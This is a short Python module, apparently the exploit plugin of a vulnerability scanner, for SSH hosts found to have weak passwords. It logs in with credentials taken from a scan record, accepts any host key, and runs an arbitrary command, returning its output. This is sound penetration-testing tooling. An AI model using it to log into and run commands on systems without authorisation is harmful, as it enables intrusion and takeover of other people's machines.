# -*- coding:utf-8 -*-
# ssh弱密码
import paramiko

from VulnScanModel.models import VulnScan



def exp(vuln: VulnScan, cmd, content=""):
    ssh = paramiko.SSHClient()  # 创建SSH对象
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 允许连接不在know_hosts文件中的主机
    ssh.connect(hostname=vuln.ip, port=22, username=vuln.specify.split(":")[0], password=vuln.specify.split(":")[-1], timeout=1)  # 连接服务器
    stdin, stdout, stderr = ssh.exec_command(cmd)
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    return result.decode()